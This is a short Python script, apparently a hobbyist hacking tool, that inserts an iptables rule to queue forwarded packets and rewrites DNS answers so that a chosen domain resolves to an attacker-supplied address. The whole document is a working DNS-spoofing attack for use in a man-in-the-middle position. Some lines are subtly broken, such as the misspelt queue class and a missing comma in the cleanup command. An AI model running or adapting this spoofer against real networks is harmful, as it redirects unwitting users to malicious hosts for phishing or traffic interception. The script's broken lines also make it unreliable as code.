#!/usr/bin/python3
## pip install netfilterqueue
import subprocess
import netfilterqueue
import scapy.all as scapy

try:
	print("[+] Creating queue 0 with iptables...")
	subprocess.run(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])

	def process_packet(packet):
		address = input("[+] Please specify the url you wish to spoof: ")
		target = input("[+] And where do you want to redirect them: ")
		scapy_packet = scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):
			qname = scapy_packet[scapy.DNSQR].qname
			if address in qname.decode():
				print("[+] Spoofing target...")
				answer = scapy.DNSRR(rrname=qname, rdata=target)
				scapy_packet[scapy.DNS].an = answer
				scapy_packet[scapy.DNS].ancount = 1
				# Delete lenght and checksum fields
				del scapy_packet[scapy.IP].len
				del scapy_packet[scapy.IP].cksum
				del scapy_packet[scapy.UDP].len
				del scapy_packet[scapy.UDP].cksum
				# Set payload for original packet
				packet.set_payload(bytes(scapy_packet))
		packet.accept()

	queue = netfilterqueue.Netfilterqueue()
	queue.bind(0, process_packet)
	queue.run()

except KeyboardInterrupt:
	print("[-] Exiting program, restoring iptables...")
	subprocess.run(["sudo", "iptables" "--flush"])
